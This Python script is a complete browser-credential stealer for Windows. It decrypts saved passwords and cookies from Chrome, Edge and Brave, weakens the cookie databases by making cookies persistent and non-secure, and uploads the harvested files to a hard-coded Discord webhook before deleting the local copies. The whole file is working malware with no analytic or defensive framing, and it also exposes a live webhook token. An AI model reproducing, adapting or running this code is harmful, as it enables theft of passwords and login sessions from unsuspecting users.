# -*- coding: utf-8 -*-
from discord_webhook import DiscordWebhook, DiscordEmbed
import os
import json
import base64
import sqlite3
import shutil
from datetime import datetime, timedelta
import win32crypt
from Crypto.Cipher import AES
discord_url = "https://discord.com/api/webhooks/1085638654266978385/7GLQ8GzmbQjY-xmc3W52EkNLFbtauAqd8IOWN0RUBikG7BGpG-n3QBzP9onOmt0nI7IF"
def googlePass():
    user = os.getlogin()

    CHROME_PATH_LOCAL_STATE = f"C:\\Users\\{user}\\AppData\\Local\\Google\\Chrome\\User Data\\Local State"

    def get_secret_key():
        try:
            with open(CHROME_PATH_LOCAL_STATE, "r", encoding='utf-8') as f:
                local_state = f.read()
                local_state = json.loads(local_state)
            secret_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
            # Remove suffix DPAPI
            secret_key = secret_key[5:]
            secret_key = win32crypt.CryptUnprotectData(secret_key, None, None, None, 0)[1]
            return secret_key
        except Exception as e:
            print("%s" % str(e))
            print("[ERROR] Chrome secretkey cannot be found")
            return None

    chrome_path_login_db = f"C:\\Users\\{user}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data"
    shutil.copy2(chrome_path_login_db, f"C:\\Users\\{user}\\Loginvault.db")

    conn = sqlite3.connect(f"C:\\Users\\{user}\\Loginvault.db")
    cursor = conn.cursor()
    cursor.execute("SELECT action_url, username_value, password_value FROM logins")
    for index, login in enumerate(cursor.fetchall()):
        url = login[0]
        username = login[1]
        ciphertext = login[2]
        initialisation_vector = ciphertext[3:15]
        encrypted_password = ciphertext[15:-16]
        secret_key = get_secret_key()
        cipher = AES.new(secret_key, AES.MODE_GCM, initialisation_vector)
        decrypted_pass = cipher.decrypt(encrypted_password)
        decrypted_pass = decrypted_pass.decode()
        if url == "" and username == "" and decrypted_pass == "":
            pass
        else:
            if not os.path.isfile(f"C:\\Users\\{user}\\{user}_passG.txt"):
                with open(f"C:\\Users\\{user}\\{user}_passG.txt", 'w') as file:
                    file.write("Url: " + url + "\nUsername: " + username + "\nPassword: " + decrypted_pass)
            else:
                with open(f"C:\\Users\\{user}\\{user}_passG.txt", 'a') as file:
                    file.write("Url: " + url + "\nUsername: " + username + "\nPassword: " + decrypted_pass)

def edgePass():

    user = os.getlogin()

    CHROME_PATH_LOCAL_STATE = f"C:\\Users\\{user}\\AppData\\Local\\Microsoft\\Edge\\User Data\\Local State"

    def get_secret_key():
        try:
            with open(CHROME_PATH_LOCAL_STATE, "r", encoding='utf-8') as f:
                local_state = f.read()
                local_state = json.loads(local_state)
            secret_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
            # Remove suffix DPAPI
            secret_key = secret_key[5:]
            secret_key = win32crypt.CryptUnprotectData(secret_key, None, None, None, 0)[1]
            return secret_key
        except Exception as e:
            print("%s" % str(e))
            print("[ERROR] Chrome secretkey cannot be found")
            return None

    chrome_path_login_db = f"C:\\Users\\{user}\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Login Data"
    shutil.copy2(chrome_path_login_db, f"C:\\Users\\{user}\\Loginvaulte.db")
    conn = sqlite3.connect(f"C:\\Users\\{user}\\Loginvaulte.db")
    cursor = conn.cursor()
    cursor.execute("SELECT action_url, username_value, password_value FROM logins")
    for index, login in enumerate(cursor.fetchall()):
        url = login[0]
        username = login[1]
        ciphertext = login[2]
        initialisation_vector = ciphertext[3:15]
        encrypted_password = ciphertext[15:-16]
        secret_key = get_secret_key()
        cipher = AES.new(secret_key, AES.MODE_GCM, initialisation_vector)
        decrypted_pass = cipher.decrypt(encrypted_password)
        decrypted_pass = decrypted_pass.decode()
        if url == "" and username == "" and decrypted_pass == "":
            pass
        else:
            if not os.path.isfile(f"C:\\Users\\{user}\\{user}_passE.txt"):
                with open(f"C:\\Users\\{user}\\{user}_passE.txt", 'w') as file:
                    file.write("Url: " + url + "\nUsername: " + username + "\nPassword: " + decrypted_pass)
            else:
                with open(f"C:\\Users\\{user}\\{user}_passE.txt", 'a') as file:
                    file.write("Url: " + url + "\nUsername: " + username + "\nPassword: " + decrypted_pass)


def bravePass():
    user = os.getlogin()

    CHROME_PATH_LOCAL_STATE = f"C:\\Users\\{user}\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Local State"

    def get_secret_key():
        try:
            with open(CHROME_PATH_LOCAL_STATE, "r", encoding='utf-8') as f:
                local_state = f.read()
                local_state = json.loads(local_state)
            secret_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
            # Remove suffix DPAPI
            secret_key = secret_key[5:]
            secret_key = win32crypt.CryptUnprotectData(secret_key, None, None, None, 0)[1]
            return secret_key
        except Exception as e:
            print("%s" % str(e))
            print("[ERROR] Chrome secretkey cannot be found")
            return None

    chrome_path_login_db = f"C:\\Users\\{user}\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Login Data"
    shutil.copy2(chrome_path_login_db, f"C:\\Users\\{user}\\Loginvaultb.db")

    conn = sqlite3.connect(f"C:\\Users\\{user}\\Loginvaultb.db")
    cursor = conn.cursor()
    cursor.execute("SELECT action_url, username_value, password_value FROM logins")
    for index, login in enumerate(cursor.fetchall()):
        url = login[0]
        username = login[1]
        ciphertext = login[2]
        initialisation_vector = ciphertext[3:15]
        encrypted_password = ciphertext[15:-16]
        secret_key = get_secret_key()
        cipher = AES.new(secret_key, AES.MODE_GCM, initialisation_vector)
        decrypted_pass = cipher.decrypt(encrypted_password)
        decrypted_pass = decrypted_pass.decode()
        if url == "" and username == "" and decrypted_pass == "":
            pass
        else:
            if not os.path.isfile(f"C:\\Users\\{user}\\{user}_passB.txt"):
                with open(f"C:\\Users\\{user}\\{user}_passB.txt", 'w') as file:
                    file.write("Url: " + url + "\nUsername: " + username + "\nPassword: " + decrypted_pass)
            else:
                with open(f"C:\\Users\\{user}\\{user}_passB.txt", 'a') as file:
                    file.write("Url: " + url + "\nUsername: " + username + "\nPassword: " + decrypted_pass)


def googleCookie():
    user = os.getlogin()

    def get_chrome_datetime(chromedate):

        if chromedate != 86400000000 and chromedate:
            try:
                return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)
            except Exception as e:
                print(f"Error: {e}, chromedate: {chromedate}")
                return chromedate
        else:
            return ""

    def get_encryption_key():
        local_state_path = os.path.join(os.environ["USERPROFILE"],
                                        "AppData", "Local", "Google", "Chrome",
                                        "User Data", "Local State")
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = f.read()
            local_state = json.loads(local_state)

        key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])

        key = key[5:]

        return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

    def decrypt_data(data, key):
        try:

            iv = data[3:15]
            data = data[15:]

            cipher = AES.new(key, AES.MODE_GCM, iv)

            return cipher.decrypt(data)[:-16].decode()
        except:
            try:
                return str(win32crypt.CryptUnprotectData(data, None, None, None, 0)[1])
            except:

                return ""

    def main():

        db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                               "Google", "Chrome", "User Data", "Default", "Network", "Cookies")

        filename = f"C:\\Users\\{user}\\CookiesG.db"
        if not os.path.isfile(filename):
            shutil.copyfile(db_path, filename)

        db = sqlite3.connect(filename)

        db.text_factory = lambda b: b.decode(errors="ignore")
        cursor = db.cursor()

        cursor.execute("""
           SELECT host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value 
           FROM cookies""")
        key = get_encryption_key()
        for host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value in cursor.fetchall():
            if not value:
                decrypted_value = decrypt_data(encrypted_value, key)
            else:
                decrypted_value = value
                if not os.path.isfile(f"C:\\Users\\{user}\\{user}_cookieG.txt"):
                    with open(f"C:\\Users\\{user}\\{user}_cookieG.txt", 'w') as file:
                        file.write(
                            "Host: " + host_key + "\nCookie name: " + name + "\nCookie value (decrypted): " + decrypted_value + "\nCreation datetime (UTC): " + str(
                                get_chrome_datetime(creation_utc)) + "\nLast access datetime (UTC): " + str(
                                get_chrome_datetime(last_access_utc)) + "\nExpires datetime (UTC): " + str(
                                get_chrome_datetime(
                                    expires_utc)) + "\n===============================================================")
                else:
                    with open(f"C:\\Users\\{user}\\{user}_cookieG.txt", 'a') as file:
                        file.write(
                            "Host: " + host_key + "\nCookie name: " + name + "\nCookie value (decrypted): " + decrypted_value + "\nCreation datetime (UTC): " + str(
                                get_chrome_datetime(creation_utc)) + "\nLast access datetime (UTC): " + str(
                                get_chrome_datetime(last_access_utc)) + "\nExpires datetime (UTC): " + str(
                                get_chrome_datetime(
                                    expires_utc)) + "\n===============================================================")

            cursor.execute("""
              UPDATE cookies SET value = ?, has_expires = 1, expires_utc = 99999999999999999, is_persistent = 1, is_secure = 0
              WHERE host_key = ?
              AND name = ?""", (decrypted_value, host_key, name))

        db.commit()

        db.close()

    main()

def edgeCookie():
    user = os.getlogin()

    def get_chrome_datetime(chromedate):
        if chromedate != 86400000000 and chromedate:
            try:
                return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)
            except Exception as e:
                print(f"Error: {e}, chromedate: {chromedate}")
                return chromedate
        else:
            return ""

    def get_encryption_key():
        local_state_path = os.path.join(os.environ["USERPROFILE"],
                                        "AppData", "Local", "Microsoft", "Edge",
                                        "User Data", "Local State")
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = f.read()
            local_state = json.loads(local_state)

        key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])

        key = key[5:]

        return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

    def decrypt_data(data, key):
        try:

            iv = data[3:15]
            data = data[15:]

            cipher = AES.new(key, AES.MODE_GCM, iv)

            return cipher.decrypt(data)[:-16].decode()
        except:
            try:
                return str(win32crypt.CryptUnprotectData(data, None, None, None, 0)[1])
            except:

                return ""

    def main():

        db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                               "Microsoft", "Edge", "User Data", "Default", "Network", "Cookies")

        filename = f"C:\\Users\\{user}\\Cookiese.db"
        if not os.path.isfile(filename):
            shutil.copyfile(db_path, filename)

        db = sqlite3.connect(filename)

        db.text_factory = lambda b: b.decode(errors="ignore")
        cursor = db.cursor()

        cursor.execute("""
           SELECT host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value 
           FROM cookies""")

        key = get_encryption_key()
        for host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value in cursor.fetchall():
            if not value:
                decrypted_value = decrypt_data(encrypted_value, key)
            else:
                decrypted_value = value
                if not os.path.isfile(f"C:\\Users\\{user}\\{user}_cookieE.txt"):
                    with open(f"C:\\Users\\{user}\\{user}_cookieE.txt", 'w') as file:
                        file.write("Host: " + host_key + "\nCookie name: " + name + "\nCookie value (decrypted): " + decrypted_value + "\nCreation datetime (UTC): " + str(get_chrome_datetime(creation_utc)) + "\nLast access datetime (UTC): " + str(get_chrome_datetime(last_access_utc)) + "\nExpires datetime (UTC): " + str(get_chrome_datetime(expires_utc)) + "\n===============================================================")
                else:
                    with open(f"C:\\Users\\{user}\\{user}_cookieE.txt", 'a') as file:
                        file.write("Host: " + host_key + "\nCookie name: " + name + "\nCookie value (decrypted): " + decrypted_value + "\nCreation datetime (UTC): " + str(get_chrome_datetime(creation_utc)) + "\nLast access datetime (UTC): " + str(get_chrome_datetime(last_access_utc)) + "\nExpires datetime (UTC): " + str(get_chrome_datetime(expires_utc)) + "\n===============================================================")

            cursor.execute("""
              UPDATE cookies SET value = ?, has_expires = 1, expires_utc = 99999999999999999, is_persistent = 1, is_secure = 0
              WHERE host_key = ?
              AND name = ?""", (decrypted_value, host_key, name))

        db.commit()

        db.close()

    main()

def braveCookie():

    user = os.getlogin()

    def get_chrome_datetime(chromedate):

        if chromedate != 86400000000 and chromedate:
            try:
                return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)
            except Exception as e:
                print(f"Error: {e}, chromedate: {chromedate}")
                return chromedate
        else:
            return ""

    def get_encryption_key():
        local_state_path = os.path.join(os.environ["USERPROFILE"],
                                        "AppData", "Local", "BraveSoftware", "Brave-Browser",
                                        "User Data", "Local State")
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = f.read()
            local_state = json.loads(local_state)

        key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])

        key = key[5:]

        return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

    def decrypt_data(data, key):
        try:

            iv = data[3:15]
            data = data[15:]

            cipher = AES.new(key, AES.MODE_GCM, iv)

            return cipher.decrypt(data)[:-16].decode()
        except:
            try:
                return str(win32crypt.CryptUnprotectData(data, None, None, None, 0)[1])
            except:

                return ""

    def main():

        db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                               "BraveSoftware", "Brave-Browser", "User Data", "Default", "Network", "Cookies")

        filename = f"C:\\Users\\{user}\\Cookiesb.db"
        if not os.path.isfile(filename):
            shutil.copyfile(db_path, filename)

        db = sqlite3.connect(filename)

        db.text_factory = lambda b: b.decode(errors="ignore")
        cursor = db.cursor()

        cursor.execute("""
           SELECT host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value 
           FROM cookies""")

        key = get_encryption_key()
        for host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value in cursor.fetchall():
            if not value:
                decrypted_value = decrypt_data(encrypted_value, key)
            else:
                decrypted_value = value
                if not os.path.isfile(f"C:\\Users\\{user}\\{user}_cookieB.txt"):
                    with open(f"C:\\Users\\{user}\\{user}_cookieB.txt", 'w') as file:
                        file.write("Host: " + host_key + "\nCookie name: " + name + "\nCookie value (decrypted): " + decrypted_value + "\nCreation datetime (UTC): " + str(get_chrome_datetime(creation_utc)) + "\nLast access datetime (UTC): " + str(get_chrome_datetime(last_access_utc)) + "\nExpires datetime (UTC): " + str(get_chrome_datetime(expires_utc)) + "\n===============================================================")
                else:
                    with open(f"C:\\Users\\{user}\\{user}_cookieB.txt", 'a') as file:
                        file.write("Host: " + host_key + "\nCookie name: " + name + "\nCookie value (decrypted): " + decrypted_value + "\nCreation datetime (UTC): " + str(get_chrome_datetime(creation_utc)) + "\nLast access datetime (UTC): " + str(get_chrome_datetime(last_access_utc)) + "\nExpires datetime (UTC): " + str(get_chrome_datetime(expires_utc)) + "\n===============================================================")
            cursor.execute("""
              UPDATE cookies SET value = ?, has_expires = 1, expires_utc = 99999999999999999, is_persistent = 1, is_secure = 0
              WHERE host_key = ?
              AND name = ?""", (decrypted_value, host_key, name))

        db.commit()

        db.close()

    main()

def main():
    user = os.getlogin()
    googlePass()
    googleCookie()
    edgePass()
    edgeCookie()
    bravePass()
    braveCookie()
    webhook = DiscordWebhook(url=discord_url)
    embed = DiscordEmbed(title=f'PERSON : {user}', description='DENEME', color='03b2f8')
    webhook.add_embed(embed)
    with open(f"C:\\Users\\{user}\\{user}_passG.txt", "rb") as f:
        webhook.add_file(file=f.read(), filename=f'{user}_passG.txt')
    with open(f"C:\\Users\\{user}\\{user}_passE.txt", "rb") as f:
        webhook.add_file(file=f.read(), filename=f'{user}_passE.txt')
    with open(f"C:\\Users\\{user}\\{user}_passB.txt", "rb") as f:
        webhook.add_file(file=f.read(), filename=f'{user}_passB.txt')
    with open(f"C:\\Users\\{user}\\{user}_cookieG.txt", "rb") as f:
        webhook.add_file(file=f.read(), filename=f'{user}_cookieG.txt')
    with open(f"C:\\Users\\{user}\\{user}_cookieE.txt", "rb") as f:
        webhook.add_file(file=f.read(), filename=f'{user}_cookieE.txt')
    with open(f"C:\\Users\\{user}\\{user}_cookieB.txt", "rb") as f:
        webhook.add_file(file=f.read(), filename=f'{user}_cookieB.txt')
    response = webhook.execute()
    os.remove(f"C:\\Users\\{user}\\{user}_passG.txt")
    os.remove(f"C:\\Users\\{user}\\{user}_passE.txt")
    os.remove(f'C:\\Users\\{user}\\{user}_cookieG.txt')
    os.remove(f'C:\\Users\\{user}\\{user}_passB.txt')
    os.remove(f'C:\\Users\\{user}\\{user}_cookieB.txt')
    os.remove(f'C:\\Users\\{user}\\{user}_cookieE.txt')

if __name__ == "__main__":
    main()
